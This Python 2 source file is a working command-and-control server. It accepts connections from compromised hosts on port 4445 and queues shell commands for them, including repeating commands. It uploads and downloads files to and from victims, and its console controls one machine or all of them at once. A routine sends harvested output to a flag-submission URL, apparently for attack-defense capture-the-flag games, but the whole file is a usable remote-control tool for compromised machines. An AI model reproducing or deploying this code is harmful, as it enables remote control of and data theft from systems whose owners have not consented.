#!coding=utf8
#!/bin/python
#
from core.log import Log
import SocketServer  
from SocketServer import StreamRequestHandler as SRH  
import time
import threading
import re
import os
import requests 
from setting import PATTERN,SUBMIT_URL

host = '0.0.0.0'  
port = 4445
addr = (host, port)

connected = {}
debug = False


class Servers(SRH):  
    #huasir
    def submit_flag(self, flag):
        try:
            res = re.findall(PATTERN,flag)
            if len(res)>0:     
                print "[+]Get flag: "+res[0]
                print requests.get(SUBMIT_URL + flag).content
        except:
            pass

    #description: deal with 'put' function
    def send_file(self, command):
        data = self.request.recv(1024)
        if 'ready' in data:
            pattern = re.compile(r'put: *([^ ]+) +.*')
            m = pattern.match(command)
            if m:
                local_file = m.group(1)
                filedata = open(local_file, 'rb').read()
                self.request.send(filedata)
                self.request.send("[!FINISHED]\n")

    #description: deal with 'get' function
    def recv_file(self, command):
        data = self.request.recv(6)
        if 'ready' in data:
            pattern = re.compile(r'get: *([^ ]+)')
            m = pattern.match(command)
            if m:
                remote_file = m.group(1)
                data_dir = os.getcwd() + '/' + self.client_address[0]
                if not os.path.exists(data_dir):
                    os.mkdir(data_dir)
                try:
                    local_file = data_dir + '/' + remote_file[remote_file.rindex('/')+1:]
                except Exception as e:
                    print e
                    local_file = data_dir + '/' + remote_file
                fp = open(local_file, "wb")
                while True:
                    buf = self.request.recv(4096)
                    if '[!FINISHED]' in buf:
                        fp.write(buf[:buf.index('[!FINISHED]')])
                        break
                    elif '[ERROR]' in buf:
                        print buf[buf.index('[ERROR]'):]
                        break
                    else:
                        fp.write(buf)
                    if 'send ok' in buf:
                        print 'send ok'
                fp.close()


    def handle(self):
        # receive connection from controled machine
        rhost = self.client_address[0]
        if not connected.has_key(rhost):
            print 'got connection from ' + rhost
            connected[rhost] = {"cmd_index": 0}
            # connected[rhost]['cmds'] = ['get:data.txt']
        host_info = connected[rhost]
        print_buf = rhost + " " + str(host_info) + "\n"
        if not host_info.has_key('cmds'):
            host_info['cmds'] = []
        cmds = host_info['cmds']

        # start to interact with controled machine
        data = self.request.recv(1024)  
        if '[get cmd]' not in data:   
            return

        # no command for this ip, stop the connection
        if len(cmds) == 0:
            return 

        # execute command circularly
        if host_info['cmd_index'] >= len(cmds):
            host_info['cmd_index'] = 0
           
        # get command which is going to be executed
        command = cmds[host_info['cmd_index']] 

        # unstop means a command will not be deleted after being executed
        if not command.startswith('unstop '):
            cmds.remove(command)
            host_info['cmds'] = cmds
        else:
            command = command[7:]

        # print_buf += command + "\n"
        self.request.send("%s [!FINISHED]" % command)

        # call specific function for put and get command
        if command.startswith("put:"):
            self.send_file(command)
        elif command.startswith("get:"):
            self.recv_file(command)

        # update data
        host_info['cmd_index'] += 1
        connected[rhost] = host_info

        cmd_result = self.request.recv(4096)
        self.submit_flag(cmd_result)

        # print result of command execute
        print_buf += "[*]cmd result:\n" + cmd_result + "\n"
        print print_buf.strip()

class CMDServer:

    @staticmethod
    def help():
        print """
        help(?)            print help information
        ls                 print connected ips and cmd information
        cmd [index] [cmd]  set command for specific ip or index of ip.
        |___[index]        when index is 0, the program will apply the
        |                  command to all the connected machines.
        |___[cmd]          there is three defferent types of cmd.
        |                  1."run:[shell command]" execute shell command
        |                  2."unstop run:[shell command]" execute shell 
        |                     command repeatly
        |                  3."put:[local] [remote]" send a local file to
        |                     target machine, "local" and "remote" both stand
        |                    for file path, it could be absolute path and 
        |                    relative path
        |                  4."get: [remote]" download remote file from 
        |                    target machine
        |___clear [index]  clear all the commands for specific ip we have set
                           if no index was specified, all commands would be cleared
        session [index]   open a virtual terminal
        exit               exit the program
        """

    # cmd shell for a single ip
    @staticmethod
    def subinteract(ip):
        while True:
            cmd = raw_input(str(Log.console("www-data@%s: " % ip)).strip('None'))
            if not cmd:
                continue
            if cmd != 'exit':
                if isinstance(ip,list):
                    for i in ip:
                        connected[i]['cmds'].append('run:' + cmd)
                elif isinstance(ip,str):
                    connected[ip]['cmds'].append('run:' + cmd)

            else:
                return

    # main interactive function
    @staticmethod
    def interactive():
        while True:
            cmd = raw_input(str(Log.console("huasir@slaves: ")).strip('None'))
            ips = []
            def ls():
                global i
                global ips
                i = 0
                ips = []
                for key in connected:
                    print i+1, key, connected[key]
                    ips.append(key)
                    i += 1

            if cmd == "ls":
                ls()
            elif cmd.startswith("cmd"):
                pattern = re.compile(r'cmd (\d+) (.*)')
                m = pattern.match(cmd)
                if m:
                    index = int(m.group(1))
                    command = m.group(2)
                    if index == 0:
                        for ip in ips:
                            connected[ip]['cmds'].append(command)
                    elif len(ips)>=index:
                        connected[ips[index-1]]['cmds'].append(command)
                    ls()
                    continue
                pattern = re.compile(r'cmd clear (\d+)')
                m = pattern.match(cmd)
                if m:
                    index = int(m.group(1))
                    connected[ips[index-1]]['cmds'] = []
                elif cmd.startswith('cmd clear'):
                    for ip in ips:
                        connected[ip]['cmds'] = []
                ls()
            elif cmd.startswith("session"):
                pattern = re.compile(r'session +(\d+) *')
                m = pattern.match(cmd)
                if m:
                    id_ip = int(m.group(1))
                    if id_ip > 0:
                        interact_ip = ips[id_ip-1]
                        CMDServer.subinteract(interact_ip)
                    elif id_ip == 0:
                        CMDServer.subinteract(ips)
                    else:
                        print 'sorry'
            elif cmd == "exit":
                exit()
            elif cmd == '?' or cmd == 'help':
                CMDServer.help()
            else:
                print 'help(?)'
    @staticmethod
    def start():
        threading.Thread(target=CMDServer.interactive).start()
        server = SocketServer.ThreadingTCPServer(addr, Servers)
        server.serve_forever()
def startcontrol():
    CMDServer.start()  

if __name__ == '__main__':
    startcontrol()
